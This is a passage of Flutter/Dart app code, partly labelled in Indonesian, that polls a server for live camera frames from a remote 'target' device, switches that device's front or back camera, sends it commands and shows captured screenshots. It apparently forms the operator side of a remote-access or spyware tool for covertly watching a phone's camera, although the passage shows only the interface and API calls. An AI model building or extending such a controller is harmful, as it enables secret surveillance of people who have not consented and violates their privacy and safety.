                    ),
                    Text(widget.targetModel, style: TextStyle(color: _t2, fontSize: 10, letterSpacing: 1)),
                  ],
                ),
              ),
            ),

            Positioned(
              top: 20, right: 20,
              child: GestureDetector(
                onTap: widget.onClose,
                child: Container(
                  width: 40, height: 40,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    color: _b2,
                    border: Border.all(color: _blue2.withOpacity(0.1)),
                  ),
                  child: Icon(Icons.close, color: _t0, size: 20),
                ),
              ),
            ),

            Positioned(
              bottom: 55, left: 30,
              child: GestureDetector(
                onTap: () {
                  final newFacing = widget.facing == 'front' ? 'back' : 'front';
                  widget.onSwitchCamera(newFacing);
                },
                child: Container(
                  width: 44, height: 44,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    color: _b2,
                    border: Border.all(color: _blue2.withOpacity(0.1)),
                  ),
                  child: Icon(Icons.switch_camera, color: _t2, size: 22),
                ),
              ),
            ),

            Positioned(
              bottom: 55, right: 30,
              child: GestureDetector(
                onTap: widget.onClose,
                child: Container(
                  width: 44, height: 44,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    color: Colors.red.withOpacity(0.1),
                    border: Border.all(color: Colors.red.withOpacity(0.2)),
                  ),
                  child: Icon(Icons.stop, color: Colors.red, size: 22),
                ),
              ),
            ),

            Positioned(
              bottom: 50, left: 0, right: 0,
              child: Center(
                child: GestureDetector(
                  onTap: widget.onCapture,
                  child: Container(
                    width: 60, height: 60,
                    decoration: BoxDecoration(
                      shape: BoxShape.circle,
                      color: _b2,
                      border: Border.all(color: _blue2.withOpacity(0.2), width: 2),
                    ),
                    child: Icon(Icons.camera_alt, color: _t0, size: 28),
                  ),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }
}

// ─── WIDGET LIVE CAMERA POLLING (REST) ──────────────────────────────
class LiveCameraPollingPage extends StatefulWidget {
  final String targetId;
  final String targetModel;
  final String facing;
  final VoidCallback onClose;
  final Function(String) onSwitchCamera;

  const LiveCameraPollingPage({
    Key? key,
    required this.targetId,
    required this.targetModel,
    required this.facing,
    required this.onClose,
    required this.onSwitchCamera,
  }) : super(key: key);

  @override
  State<LiveCameraPollingPage> createState() => _LiveCameraPollingPageState();
}

class _LiveCameraPollingPageState extends State<LiveCameraPollingPage> {
  String _currentFrame = '';
  bool _isLoading = true;
  Timer? _pollingTimer;
  String _currentFacing = '';

  final Color _b0 = const Color(0xFF020510);
  final Color _b2 = const Color(0xFF081428);
  final Color _blue2 = const Color(0xFF4d8fff);
  final Color _t0 = const Color(0xFFe8f4ff);
  final Color _t2 = const Color(0xFF3d6080);

  @override
  void initState() {
    super.initState();
    _currentFacing = widget.facing;
    _fetchFrame();
    
    _pollingTimer = Timer.periodic(const Duration(seconds: 2), (timer) {
      _fetchFrame();
    });
  }

  Future<void> _fetchFrame() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final token = prefs.getString('key') ?? '';
      
      final response = await http.get(
        Uri.parse("$baseUrl/api/live-camera/${widget.targetId}?facing=$_currentFacing"),
        headers: {"x-auth-token": token},
      );

      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        if (data['frame'] != null && data['frame'].isNotEmpty) {
          if (mounted) {
            setState(() {
              _currentFrame = data['frame'];
              _isLoading = false;
            });
          }
        }
      }
    } catch (e) {
      // Silent fail
    }
  }

  @override
  void dispose() {
    _pollingTimer?.cancel();
    widget.onClose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: SafeArea(
        child: Stack(
          children: [
            if (_currentFrame.isNotEmpty)
              Center(
                child: RepaintBoundary(
                  child: InteractiveViewer(
                    minScale: 0.5,
                    maxScale: 3.0,
                    child: Image.memory(
                      base64Decode(_currentFrame.split(',').last),
                      fit: BoxFit.contain,
                      width: double.infinity,
                      height: double.infinity,
                      errorBuilder: (context, error, stackTrace) {
                        return Center(
                          child: Text(
                            "Error loading camera",
                            style: TextStyle(color: _t2),
                          ),
                        );
                      },
                    ),
                  ),
                ),
              )
            else
              Center(
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    SizedBox(
                      width: 50,
                      height: 50,
                      child: CircularProgressIndicator(
                        color: _blue2,
                        strokeWidth: 3,
                      ),
                    ),
                    const SizedBox(height: 20),
                    Text(
                      "CONNECTING CAMERA...",
                      style: TextStyle(
                        color: _t2,
                        fontSize: 13,
                        letterSpacing: 3,
                      ),
                    ),
                  ],
                ),
              ),

            Positioned(
              top: 0,
              left: 0,
              right: 0,
              child: Container(
                padding: const EdgeInsets.fromLTRB(20, 20, 20, 20),
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    begin: Alignment.topCenter,
                    end: Alignment.bottomCenter,
                    colors: [Colors.black.withOpacity(0.7), Colors.transparent],
                  ),
                ),
                child: Row(
                  mainAxisAlignment: MainAxisAlignment.spaceBetween,
                  children: [
                    Row(
                      children: [
                        Container(
                          width: 10,
                          height: 10,
                          decoration: const BoxDecoration(
                            color: Colors.red,
                            shape: BoxShape.circle,
                          ),
                        ),
                        const SizedBox(width: 10),
                        Text(
                          "LIVE",
                          style: TextStyle(
                            color: _t0,
                            fontSize: 14,
                            fontWeight: FontWeight.bold,
                            letterSpacing: 2,
                          ),
                        ),
                        const SizedBox(width: 16),
                        Container(
                          padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                          decoration: BoxDecoration(
                            color: _b2,
                            borderRadius: BorderRadius.circular(4),
                          ),
                          child: Text(
                            _currentFacing.toUpperCase(),
                            style: TextStyle(
                              color: _t2,
                              fontSize: 10,
                              letterSpacing: 1,
                            ),
                          ),
                        ),
                      ],
                    ),
                    Text(
                      widget.targetModel,
                      style: TextStyle(
                        color: _t2,
                        fontSize: 10,
                        letterSpacing: 1,
                      ),
                    ),
                  ],
                ),
              ),
            ),

            Positioned(
              top: 20,
              right: 20,
              child: GestureDetector(
                onTap: widget.onClose,
                child: Container(
                  width: 40,
                  height: 40,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    color: _b2,
                    border: Border.all(color: _blue2.withOpacity(0.1)),
                  ),
                  child: Icon(
                    Icons.close,
                    color: _t0,
                    size: 20,
                  ),
                ),
              ),
            ),

            Positioned(
              bottom: 55,
              left: 30,
              child: GestureDetector(
                onTap: () {
                  final newFacing = _currentFacing == 'front' ? 'back' : 'front';
                  setState(() {
                    _currentFacing = newFacing;
                    _isLoading = true;
                    _currentFrame = '';
                  });
                  widget.onSwitchCamera(newFacing);
                  _fetchFrame();
                },
                child: Container(
                  width: 44,
                  height: 44,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    color: _b2,
                    border: Border.all(color: _blue2.withOpacity(0.1)),
                  ),
                  child: Icon(
                    Icons.switch_camera,
                    color: _t2,
                    size: 22,
                  ),
                ),
              ),
            ),

            Positioned(
              bottom: 55,
              right: 30,
              child: GestureDetector(
                onTap: widget.onClose,
                child: Container(
                  width: 44,
                  height: 44,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    color: Colors.red.withOpacity(0.1),
                    border: Border.all(color: Colors.red.withOpacity(0.2)),
                  ),
                  child: Icon(
                    Icons.stop,
                    color: Colors.red,
                    size: 22,
                  ),
                ),
              ),
            ),

            Positioned(
              bottom: 50,
              left: 0,
              right: 0,
              child: Center(
                child: GestureDetector(
                  onTap: () {
                    _sendCommand('camera', extra: _currentFacing);
                  },
                  child: Container(
                    width: 60,
                    height: 60,
                    decoration: BoxDecoration(
                      shape: BoxShape.circle,
                      color: _b2,
                      border: Border.all(color: _blue2.withOpacity(0.2), width: 2),
                    ),
                    child: Icon(
                      Icons.camera_alt,
                      color: _t0,
                      size: 28,
                    ),
                  ),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  void _sendCommand(String command, {String? extra}) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final token = prefs.getString('key') ?? '';
      await http.post(
        Uri.parse("$baseUrl/api/command/${widget.targetId}"),
        headers: {"Content-Type": "application/json", "x-auth-token": token},
        body: jsonEncode({"command": command, "value": extra ?? ""}),
      );
    } catch (_) {}
  }
}

// ─── WIDGET SCREENSHOT RESULT ────────────────────────────────────────
class ScreenshotResultPage extends StatelessWidget {
  final String targetModel;
  final String screenshotFrame;
  final String screenshotFacing;
  final VoidCallback onClose;

  final Color _b0 = const Color(0xFF020510);
  final Color _b2 = const Color(0xFF081428);
  final Color _blue2 = const Color(0xFF4d8fff);
  final Color _t0 = const Color(0xFFe8f4ff);
  final Color _t2 = const Color(0xFF3d6080);

  const ScreenshotResultPage({
    Key? key,
    required this.targetModel,
    required this.screenshotFrame,
    required this.screenshotFacing,
    required this.onClose,
  }) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black.withOpacity(0.95),
      body: SafeArea(
        child: Stack(
          children: [
            Center(
              child: InteractiveViewer(
                minScale: 0.5,
                maxScale: 3.0,
                child: Image.memory(
                  base64Decode(screenshotFrame.split(',').last),
                  fit: BoxFit.contain,
                  width: MediaQuery.of(context).size.width * 0.9,
                  height: MediaQuery.of(context).size.height * 0.7,
                  errorBuilder: (context, error, stackTrace) {
                    return Center(
                      child: Text(
                        "Gagal load gambar",
                        style: TextStyle(color: _t2),
                      ),
                    );
                  },
                ),
              ),
            ),
            Positioned(
              top: 0,
              left: 0,
              right: 0,
              child: Container(
                padding: const EdgeInsets.all(16),
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    begin: Alignment.topCenter,
                    end: Alignment.bottomCenter,
                    colors: [Colors.black.withOpacity(0.75), Colors.transparent],
                  ),
                ),
                child: Row(
                  mainAxisAlignment: MainAxisAlignment.spaceBetween,
                  children: [
                    Row(
                      children: [
                        Container(
                          width: 8,
                          height: 8,
                          decoration: const BoxDecoration(
                            color: Colors.red,
                            shape: BoxShape.circle,
                          ),
                        ),
                        const SizedBox(width: 8),
                        Text(
                          "KAMERA ${screenshotFacing.toUpperCase()}",
                          style: TextStyle(
                            color: _t0,
                            fontSize: 12,
                            letterSpacing: 2,
                          ),
                        ),
                        const SizedBox(width: 12),
                        Text(
                          targetModel,
                          style: TextStyle(
                            color: _t2,
                            fontSize: 9,
                            letterSpacing: 1,
                          ),
                        ),
                      ],
                    ),
                    Text(
                      DateTime.now().toLocal().toString().substring(11, 19),
                      style: TextStyle(
                        color: _t2,
                        fontSize: 9,
                        letterSpacing: 1,
                      ),
                    ),
                  ],
                ),
              ),
            ),
            Positioned(
              top: 16,
              right: 16,
              child: GestureDetector(
                onTap: onClose,
                child: Container(
                  width: 40,
                  height: 40,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    color: _b2,
                    border: Border.all(color: _blue2.withOpacity(0.1)),
                  ),
                  child: Icon(
                    Icons.close,
                    color: _t0,
                    size: 20,
                  ),
                ),
              ),
            ),
            Positioned(
              bottom: 0,
              left: 0,
              right: 0,
              child: Container(
                padding: const EdgeInsets.symmetric(vertical: 16, horizontal: 16),
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    begin: Alignment.bottomCenter,
                    end: Alignment.topCenter,
                    colors: [Colors.black.withOpacity(0.75), Colors.transparent],
                  ),
                ),
                child: Row(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    GestureDetector(
                      onTap: () {},
                      child: Container(
                        width: 44,
                        height: 44,
                        decoration: BoxDecoration(
                          shape: BoxShape.circle,
                          border: Border.all(color: _blue2.withOpacity(0.1), width: 1),
                        ),
                        child: Icon(Icons.zoom_out, color: _t0),
                      ),
                    ),
                    const SizedBox(width: 20),
                    Text(
                      "100%",
                      style: TextStyle(
                        color: _t0,
                        fontSize: 12,
                        fontFamily: 'monospace',
                      ),
                    ),
                    const SizedBox(width: 20),
                    GestureDetector(
                      onTap: () {},
                      child: Container(
                        width: 44,
                        height: 44,
                        decoration: BoxDecoration(
                          shape: BoxShape.circle,
                          border: Border.all(color: _blue2.withOpacity(0.1), width: 1),
                        ),
                        child: Icon(Icons.zoom_in, color: _t0),
                      ),
                    ),
                    const SizedBox(width: 24),
                    Container(
                      decoration: BoxDecoration(
                        gradient: LinearGradient(
                          colors: [_blue2, _blue2.withOpacity(0.5)],
                        ),
                        borderRadius: BorderRadius.circular(10),
                      ),
                      child: ElevatedButton.icon(
                        onPressed: () {},
                        icon: const Icon(Icons.download, size: 18, color: Colors.white),
                        label: const Text("DOWNLOAD", style: TextStyle(color: Colors.white)),
                        style: ElevatedButton.styleFrom(
                          backgroundColor: Colors.transparent,
                          shadowColor: Colors.transparent,
                          shape: RoundedRectangleBorder(
                            borderRadius: BorderRadius.circular(10),
                          ),
                        ),
                      ),
                    ),
                    const SizedBox(width: 12),
                    Container(
                      decoration: BoxDecoration(
                        color: _b2,
                        borderRadius: BorderRadius.circular(10),
                      ),
                      child: ElevatedButton.icon(
                        onPressed: onClose,
                        icon: Icon(Icons.close, size: 18, color: _t2),
                        label: Text("TUTUP", style: TextStyle(color: _t2)),
                        style: ElevatedButton.styleFrom(
                          backgroundColor: Colors.transparent,
                          shadowColor: Colors.transparent,
                          shape: RoundedRectangleBorder(
                            borderRadius: BorderRadius.circular(10),
                          ),
                        ),
                      ),
                    ),
                  ],
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }
}